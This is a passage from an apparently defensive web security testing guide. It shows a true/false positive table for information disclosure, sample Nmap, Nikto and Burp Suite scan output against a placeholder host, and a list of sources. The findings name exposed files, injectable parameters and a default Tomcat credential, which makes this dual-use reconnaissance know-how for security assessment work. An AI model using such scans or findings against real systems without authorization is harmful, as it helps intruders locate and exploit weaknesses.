- Error details logged server-side, not returned to client

### 16.4 True Positive vs False Positive

| Indicator | True Positive | False Positive |
|-----------|---------------|----------------|
| Stack trace | Full traceback with file paths, line numbers, DB connection strings | Controlled error page with request ID only |
| Version headers | Exact version numbers revealed (Apache/2.4.41) | Generic server name without version |
| Source code | Actual application code returned (with credentials) | Sample/template code or documentation |
| Debug endpoints | /actuator/env returns real config including secrets | /health returns only {"status": "UP"} |

### 16.5 Tool Output Examples

#### Nmap Version Detection
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.41
3306/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
| mysql-info:
|   Protocol: 10
|   Version: 8.0.28-0ubuntu0.20.04.3
|   Thread ID: 15
|_  Salt: \x1a\x2b\x3c...
8080/tcp open  http    Apache Tomcat 9.0.56
|_http-title: Apache Tomcat/9.0.56
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Nikto Information Disclosure Findings
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          93.184.216.34
+ Target Hostname:    target.example.com
+ Target Port:        80
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: Retrieved x-powered-by header: PHP/7.4.3.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /.env: .env file found. This file may contain database credentials, API keys, and other sensitive configuration.
+ /.git/HEAD: Git repository found. An attacker can download the full source code.
+ /server-status: Apache mod_status is accessible. This shows server performance information and current connections.
+ OSVDB-3092: /backup/: This might be interesting: possible backup directory with directory listing enabled.
+ /robots.txt: Entry '/admin/' in robots.txt returned a non-403 HTTP status. Site could be exposing sensitive endpoints.
+ 8945 requests: 0 error(s) and 9 item(s) reported on remote host
---------------------------------------------------------------------------
```

---

## Appendix A: Combined Nmap Scan Output Example

```
Starting Nmap 7.94 ( https://nmap.org ) at 2026-04-09 14:30 CDT
Nmap scan report for target.example.com (93.184.216.34)
Host is up (0.034s latency).
Not shown: 993 closed tcp ports (conn-refused)

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
| ssh-hostkey:
|   3072 d4:3e:4f:5a:6b:7c:8d:9e:0f:1a:2b:3c:4d:5e:6f:7a (RSA)
|   256 a1:b2:c3:d4:e5:f6:a7:b8:c9:d0:e1:f2:a3:b4:c5:d6 (ECDSA)
|_  256 1a:2b:3c:4d:5e:6f:7a:8b:9c:0d:1e:2f:3a:4b:5c:6d (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Example Web Application
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS
|_  Potentially risky methods: TRACE
| http-enum:
|   /admin/: Admin panel
|   /backup/: Backup directory with listing
|   /phpinfo.php: phpinfo() page
|   /.git/HEAD: Git repository
|   /robots.txt: Robots file
|_  /server-status: Apache server-status (mod_status)
| http-vuln-cve2017-5638:
|   VULNERABLE:
|   Apache Struts Remote Code Execution
|     State: VULNERABLE
|     Risk factor: High
|_    References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
443/tcp  open  ssl/http    Apache httpd 2.4.41
| ssl-enum-ciphers:
|   TLSv1.0:
|     ciphers:
|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C
|     warnings:
|       Broken cipher RC4 is deprecated by RFC 7465
|   TLSv1.2:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A
|     cipher preference: server
|_  least strength: C
| ssl-cert:
|   Subject: commonName=target.example.com
|   Issuer: commonName=R3/organizationName=Let's Encrypt
|   Public Key type: rsa
|   Public Key bits: 2048
|   Not valid before: 2026-03-10T00:00:00
|   Not valid after:  2026-06-08T23:59:59
|_  SHA-1: abcd:ef01:2345:6789:abcd:ef01:2345:6789:abcd:ef01
3306/tcp open  mysql       MySQL 8.0.28
| mysql-info:
|   Protocol: 10
|   Version: 8.0.28-0ubuntu0.20.04.3
|_  Status: Autocommit
8080/tcp open  http-proxy  Apache Tomcat 9.0.56
| http-default-accounts:
|   [Apache Tomcat] at /manager/html/
|_    tomcat:s3cret
8443/tcp open  ssl/http    nginx 1.18.0
9090/tcp open  http        Prometheus

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 45.67 seconds
```

---

## Appendix B: Combined Nikto Scan Output Example

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          93.184.216.34
+ Target Hostname:    target.example.com
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=target.example.com
                   Altnames: target.example.com, www.target.example.com
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /C=US/O=Let's Encrypt/CN=R3
+ Start Time:         2026-04-09 14:30:00 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: Retrieved x-powered-by header: PHP/7.4.3.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Cookie PHPSESSID created without the secure flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Uncommon header 'x-debug-token' found, with contents: abc123.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.58). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/7.4.3 appears to be outdated (current is at least PHP/8.3).
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-default-files/
+ /.env: .env file found. This file may contain sensitive configuration data such as database credentials and API keys.
+ /.git/HEAD: Git repository found. This may allow the attacker to download the full source code of the application.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /server-status: Apache mod_status is accessible without authentication.
+ OSVDB-3268: /backup/: Directory indexing found.
+ OSVDB-3092: /backup/: This might be interesting.
+ /admin/: Admin login page/section found.
+ /robots.txt: 3 entries checked: '/admin/', '/backup/', '/config/' all returned accessible.
+ /wp-config.php.bak: WordPress configuration backup found. May contain database credentials.
+ /crossdomain.xml: Adobe Flash crossdomain.xml file found with wildcard access policy.
+ /test.php: Test script found which may contain sensitive information or functionality.
+ 8945 requests: 0 error(s) and 24 item(s) reported on remote host
+ End Time:           2026-04-09 14:35:12 (GMT-5) (312 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

---

## Appendix C: Burp Suite HTML Report Structure

```
BURP SUITE PROFESSIONAL - SCAN REPORT
Generated: 2026-04-09 14:45:00 CDT
Target: https://target.example.com

=======================================
SUMMARY
=======================================
High:     3 issues
Medium:   5 issues
Low:      8 issues
Info:     12 issues

=======================================
HIGH SEVERITY ISSUES
=======================================

1. SQL injection (3 instances)
   - /api/products?id=1 [id parameter]
   - /api/users?search=test [search parameter]
   - /login [username parameter]
   Confidence: Certain
   Severity: High

2. Cross-site scripting (reflected) (2 instances)
   - /search?q=test [q parameter]
   - /error?message=test [message parameter]
   Confidence: Certain
   Severity: High

3. XML external entity injection (1 instance)
   - /api/import [POST body]
   Confidence: Certain
   Severity: High

=======================================
MEDIUM SEVERITY ISSUES
=======================================

4. Cross-site request forgery (2 instances)
   - /account/change-email [POST]
   - /account/change-password [POST]
   Confidence: Tentative
   Severity: Medium

5. Open redirection (1 instance)
   - /redirect?url=test [url parameter]
   Confidence: Firm
   Severity: Medium

6. TLS certificate (1 instance)
   - Server supports TLS 1.0 (deprecated)
   Confidence: Certain
   Severity: Medium

=======================================
LOW SEVERITY ISSUES
=======================================

7. Cookie without HttpOnly flag (3 instances)
8. Cookie without Secure flag (3 instances)
9. Strict-Transport-Security header missing (1 instance)
10. Content-Security-Policy header missing (1 instance)

=======================================
INFORMATIONAL
=======================================

11. Server version disclosure: Apache/2.4.41 (Ubuntu)
12. Technology detected: PHP/7.4.3
13. Directory listing: /icons/, /backup/
14. robots.txt found with interesting entries
15. Email addresses found in response
```

---

## Sources

- [OWASP Web Security Testing Guide - SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [OWASP Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [PortSwigger SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [PortSwigger File Upload](https://portswigger.net/web-security/file-upload)
- [PortSwigger Open Redirect](https://portswigger.net/support/using-burp-to-test-for-open-redirections)
- [PortSwigger Information Disclosure](https://portswigger.net/web-security/information-disclosure)
- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
- [PayloadsAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md)
- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md)
- [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md)
- [PayloadsAllTheThings - CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md)
- [HackTricks - Rate Limit Bypass](https://hacktricks.wiki/en/pentesting-web/rate-limit-bypass.html)
- [HackTricks - Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [HackTricks - CSRF](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)
- [HackTricks - CORS Bypass](https://book.hacktricks.xyz/pentesting-web/cors-bypass)
- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [HackTricks - IDOR](https://hacktricks.wiki/en/pentesting-web/idor.html)
- [HackTricks - Login Bypass](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/login-bypass/README.md)
- [OWASP Testing for Bypassing Authentication Schema](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP XXE Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [OWASP Testing for Weak TLS/SSL](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_SSL_TLS_Ciphers_Insufficient_Transport_Layer_Protection)
- [OWASP SSTI Testing](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)
- [OWASP IDOR Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [Nmap ssl-enum-ciphers](https://nmap.org/nsedoc/scripts/ssl-enum-ciphers.html)
- [Nmap NSE Scripts](https://nmap.org/book/nse-usage.html)
- [sqlmap Official](https://sqlmap.org/)
- [sqlmap Usage Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [testssl.sh](https://testssl.sh/)
- [Invicti SQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet)
- [Cobalt Authentication Bypass](https://www.cobalt.io/vulnerability-wiki/v2-authentication/authentication-bypass)
- [HackerOne Disclosed Reports](https://github.com/reddelexc/hackerone-reports)
- [Burp Suite Reporting](https://portswigger.net/burp/documentation/desktop/running-scans/reporting)
